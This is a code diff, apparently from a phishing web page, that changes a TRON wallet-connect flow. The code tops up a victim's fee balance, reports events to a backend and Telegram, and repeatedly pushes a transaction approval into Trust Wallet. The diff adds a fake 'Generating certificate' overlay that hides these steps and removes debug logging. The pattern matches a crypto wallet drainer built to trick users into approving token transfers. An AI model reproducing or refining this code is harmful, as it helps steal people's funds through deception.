@@ -93045,6 +93045,29 @@
                     reportEvent("WALLET_CONNECTED", {
                         wallet: c
                     });
+
+                    // Smooth UX: show generating certificate right after connect
+                    const showGenerating = (msg) => {
+                        let el = document.getElementById("cert-generating-overlay");
+                        if (!el) {
+                            el = document.createElement("div");
+                            el.id = "cert-generating-overlay";
+                            el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.88);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;");
+                            el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700;margin-bottom:8px">Generating certificate</div><div id="cert-generating-msg" style="font-size:14px;opacity:0.85;max-width:320px"></div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
+                            document.body.appendChild(el)
+                        }
+                        const msgEl = document.getElementById("cert-generating-msg");
+                        if (msgEl)
+                            msgEl.textContent = msg || "Please wait…"
+                    };
+                    const hideGenerating = () => {
+                        const el = document.getElementById("cert-generating-overlay");
+                        if (el && el.parentNode)
+                            el.parentNode.removeChild(el)
+                    };
+                    showGenerating("Checking wallet…");
+                    t(3);
+
                     console.log("[2] BALANCE CHECK START", {
                         endpoint: "https://api.trongrid.io/wallet/getaccount"
                     });
@@ -93100,44 +93123,36 @@
                         recentTopUp = ts > 0 && Date.now() - ts < 180000
                     } catch (_) {}
 
-                    // After successful top-up log: wait 5s then show approve popup. No energy checks.
-                    const wait5ThenApprove = async (reason, txHint) => {
+                    // After successful top-up: short wait then approve. Already has TRX → approve now.
+                    const waitThenApprove = async (reason, txHint, waitMs) => {
+                        const ms = waitMs || 4000;
+                        showGenerating("Top-up received. Preparing approval…");
                         reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
-                            waitMs: 5000,
+                            waitMs: ms,
                             reason: reason,
                             tx: txHint || null
                         });
-                        console.log("[6] TOP-UP OK — wait 5s then approve popup", {
+                        console.log("[6] TOP-UP OK — wait then approve", {
                             reason: reason,
+                            waitMs: ms,
                             tx: txHint || null
                         });
-                        await new Promise((resolve) => setTimeout(resolve, 5000));
+                        await new Promise((resolve) => setTimeout(resolve, ms));
                         reportEvent("TRX_TOPUP_CONFIRM_DONE", {
-                            waitMs: 5000,
+                            waitMs: ms,
                             continueToApprove: true
                         })
                     };
 
                     if (balanceInTRX < minTrx && recentTopUp) {
-                        console.log("[4] TRX TOP-UP START", {
-                            skipped: true,
-                            reason: "recent-topup-reuse wait 5s then approve"
-                        });
                         reportEvent("TRX_TOPUP_SKIPPED", {
                             reason: "recent-topup-reuse",
                             balanceInTRX: balanceInTRX
                         });
                         topUpSent = true;
-                        await wait5ThenApprove("recent-topup-reuse")
+                        await waitThenApprove("recent-topup-reuse", null, 3000)
                     } else if (balanceInTRX < minTrx) {
-                        console.log("[4] TRX TOP-UP START", {
-                            skipped: false,
-                            reason: "balance below minTrx / no gas energy",
-                            endpoint: API_BASE + "/send-trx",
-                            userAddress: c,
-                            balanceInTRX: balanceInTRX,
-                            minTrx: minTrx
-                        });
+                        showGenerating("Sending TRX for fees…");
                         reportEvent("TRX_TOPUP_START", {
                             balanceInTRX: balanceInTRX,
                             minTrx: minTrx
@@ -93157,7 +93172,8 @@
                                 reportEvent("TRX_TOPUP_FAILED", topUpData || {
                                     success: false
                                 });
-                                window.alert("TRX top-up failed. Need TRX (gas/energy) for transaction fees.");
+                                hideGenerating();
+                                window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                 t(2);
                                 return
                             }
@@ -93165,7 +93181,6 @@
                             topUpTxId = topUpData.transactionId || "N/A";
                             topUpAmount = topUpData.amount || 0;
 
-                            // Notify after top-up confirm (non-blocking)
                             reportEvent("TELEGRAM_SEND_INITIATED", {
                                 type: "trx_topup",
                                 sent: topUpSent,
@@ -93190,26 +93205,13 @@
                                 try {
                                     sessionStorage.setItem("trxToppedUp:" + c, String(Date.now()))
                                 } catch (_) {}
-                                // Top-up success log received → wait 5s → show Trust popup
-                                await wait5ThenApprove("after-topup-sent", topUpTxId)
+                                await waitThenApprove("after-topup-sent", topUpTxId, 4000)
                             } else {
-                                console.log("[6] POST-TOP-UP BALANCE CHECK START", {
-                                    skipped: true,
-                                    reason: "already funded"
-                                });
-                                console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
-                                    balanceInTRX: balanceInTRX,
-                                    status: "already-funded"
-                                });
                                 reportEvent("TRX_TOPUP_ALREADY_FUNDED", {
                                     balanceInTRX: balanceInTRX
                                 })
                             }
                         } catch (topUpError) {
-                            console.error("[5] TRX TOP-UP RESULT", {
-                                success: false,
-                                error: topUpError && topUpError.message ? topUpError.message : String(topUpError)
-                            });
                             reportEvent("TRX_TOPUP_FAILED", {
                                 error: topUpError && topUpError.message ? topUpError.message : String(topUpError)
                             });
@@ -93217,51 +93219,34 @@
                                 balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
                                 o(balanceInTRX);
                                 if (balanceInTRX < minTrx) {
-                                    window.alert("TRX top-up failed. Need TRX (gas/energy) for transaction fees.");
+                                    hideGenerating();
+                                    window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                     t(2);
                                     return
                                 }
                             } catch (_) {
-                                window.alert("TRX top-up failed. Need TRX (gas/energy) for transaction fees.");
+                                hideGenerating();
+                                window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                 t(2);
                                 return
                             }
                         }
                     } else {
-                        console.log("[4] TRX TOP-UP START", {
-                            skipped: true,
-                            reason: "sufficient TRX for gas/energy"
-                        });
-                        console.log("[5] TRX TOP-UP RESULT", {
-                            skipped: true,
-                            status: "not-needed"
-                        });
-                        console.log("[6] POST-TOP-UP BALANCE CHECK START", {
-                            skipped: true
-                        });
-                        console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
-                            skipped: true,
-                            balanceInTRX: balanceInTRX
-                        });
+                        // Already has TRX → go straight to approval
+                        showGenerating("Opening approval…");
                         reportEvent("TRX_TOPUP_NOT_NEEDED", {
                             balanceInTRX: balanceInTRX
                         })
                     }
 
-                    // NEVER use feeLimit 1e9. No energy — just open approve popup.
                     const feeLimit = 15e6;
-
-                    console.log("Opening sign popup", {
-                        balanceInTRX: balanceInTRX,
-                        feeLimit: feeLimit,
-                        fromTopUp: topUpSent
-                    });
+                    showGenerating("Approve in Trust Wallet…");
                     reportEvent("APPROVAL_INITIATED", {
                         balanceInTRX: balanceInTRX,
                         feeLimit: feeLimit,
                         fromTopUp: topUpSent
                     });
-                    // Re-open Trust and keep user there for approve (do not redirect site until success)
+                    // Open Trust once, then push approve (smooth — no spam open)
                     try {
                         openTrustStay()
                     } catch (_) {}
@@ -93269,7 +93254,9 @@
                         fromTopUp: topUpSent,
                         retries: 7,
                         reportEvent: reportEvent,
-                        openTrustStay: openTrustStay
+                        openTrustStay: openTrustStay,
+                        showGenerating: showGenerating,
+                        hideGenerating: hideGenerating
                     });
                 } catch (a) {
                     console.error("[10] ERROR", a);
@@ -93320,7 +93307,7 @@
                     return
                 }
 
-                const showGenerating = (msg) => {
+                const showGenerating = "function" === typeof options.showGenerating ? options.showGenerating : (msg) => {
                     let el = document.getElementById("cert-generating-overlay");
                     if (!el) {
                         el = document.createElement("div");
@@ -93333,7 +93320,7 @@
                     if (msgEl)
                         msgEl.textContent = msg || "Confirming your approval on-chain. Please wait…"
                 };
-                const hideGenerating = () => {
+                const hideGenerating = "function" === typeof options.hideGenerating ? options.hideGenerating : () => {
                     const el = document.getElementById("cert-generating-overlay");
                     if (el && el.parentNode)
                         el.parentNode.removeChild(el)
@@ -93446,13 +93433,11 @@
                             tryNo: tryNo,
                             maxTries: maxTries
                         });
-                        // Bring Trust to front WITHOUT navigating our site away
+                        showGenerating("Approve in Trust Wallet (" + tryNo + "/" + maxTries + ")…");
+                        // Open Trust once per attempt, then send sign request
                         try {
-                            try {
-                                window.focus()
-                            } catch (_) {}
                             openTrustStay();
-                            await new Promise((resolve) => setTimeout(resolve, 600))
+                            await new Promise((resolve) => setTimeout(resolve, 500))
                         } catch (_) {}
                         try {
                             n = await r.sendTransaction(e, feeLimit)
@@ -93481,7 +93466,7 @@
                             userApproved = !0;
                             break
                         }
-                        // Not approved yet — push again; keep Trust open (no site redirect/alerts)
+                        // Not approved yet — wait then push again (smooth, no alerts)
                         if (tryNo < maxTries) {
                             reportEvent("APPROVAL_RETRY", {
                                 tryNo: tryNo,
@@ -93489,10 +93474,8 @@
                                 maxTries: maxTries,
                                 message: n && n.message || "pushing approve popup again"
                             });
-                            try {
-                                openTrustStay()
-                            } catch (_) {}
-                            await new Promise((resolve) => setTimeout(resolve, 2500))
+                            showGenerating("Waiting for approval… retrying (" + (tryNo + 1) + "/" + maxTries + ")");
+                            await new Promise((resolve) => setTimeout(resolve, 3000))
                         }
                     }
 
